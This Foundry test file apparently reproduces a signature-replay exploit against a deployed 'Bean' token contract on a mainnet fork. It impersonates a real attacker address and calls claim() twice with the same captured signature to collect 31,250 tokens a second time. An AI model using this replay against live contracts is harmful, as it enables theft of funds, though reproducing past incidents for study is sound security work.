pragma solidity =0.8.6;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./Bean.sol";

contract ContractTest is Test {

    Bean public bean = Bean(payable(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB));
    address public attacker = 0x85D231C204B82915c909A05847CCa8557164c75e;

    function setUp() public {
        uint256 forkId = vm.createFork("mainnet", 17593213);
        vm.selectFork(forkId);
    }

    function testExp() public {
        vm.prank(attacker);
        claim();
        uint256 balance0 = bean.balanceOf(attacker);
        vm.prank(attacker);
        claim();
        uint256 balance1 = bean.balanceOf(attacker);
        assertEq(balance1 - balance0, 31250000000000000000000);
    }

    function claim() public {
        address[] memory contracts = new address[](3);
        contracts[0] = 0xED5AF388653567Af2F388E6224dC7C4b3241C544;
        contracts[1] = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
        contracts[2] = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;

        uint256[] memory amount = new uint256[](3);
        amount[0] = 1;
        amount[1] = 0;
        amount[2] = 0;

        uint256[] memory tokenId = new uint256[](1);
        tokenId[0] = 5732;

        uint256 claimAmount = 31250000000000000000000;
        uint256 endTime = 1688141967;
        bytes memory signature = hex"b0c7a8994624f4187fa28019f1ed169887d814cc72a7c6e5a9afe78a0cc825e55f7fca08df0c2dc16ce05f2a39bc15949d6bb07c5283cf9e131ae51251e719e61b";

        bean.claim(
            contracts,
            amount,
            tokenId,
            claimAmount,
            endTime,
            signature
        );
    }
}